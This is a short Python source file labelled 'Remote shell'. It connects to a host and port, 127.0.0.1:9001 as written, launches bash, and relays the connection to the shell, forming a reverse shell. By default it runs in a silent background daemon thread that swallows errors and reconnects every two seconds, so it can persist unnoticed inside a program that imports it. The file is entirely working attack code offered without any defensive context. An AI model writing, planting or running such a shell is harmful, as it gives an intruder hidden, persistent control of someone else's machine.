"""
Remote shell

Optionally blocks the execution
"""
import asyncio

HOST = '127.0.0.1'
PORT = 9001

async def forward_output(proc, writer):
    async for line in proc.stdout:
        writer.write(line)
        await writer.drain()
    writer.close()
    await writer.wait_closed()

async def forward_input(reader, proc):
    try:
        while True:
            data = await reader.read(1024)
            if not data:
                break
            proc.stdin.write(data)
            await proc.stdin.drain()
        proc.stdin.close()
        await proc.stdin.wait_closed()
    except asyncio.CancelledError:
        pass

async def main():
    reader, writer = await asyncio.open_connection(HOST, PORT)
    proc = await asyncio.create_subprocess_exec(
        'bash',
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    await asyncio.gather(
        forward_output(proc, writer),
        forward_input(reader, proc),
    )
    await proc.wait()


BLOCK_EXEC = False

if BLOCK_EXEC:
  asyncio.run(main())
else:
  # Running in a thread

  def start_background_loop():
    while True:
      # print("Creating a rshell...")
      try:
        asyncio.run(main())
      except Exception:
        pass
      # print("Awaiting...")
      asyncio.run(asyncio.sleep(2))

  import threading

  thread = threading.Thread(target=start_background_loop, daemon=True)
  thread.start()
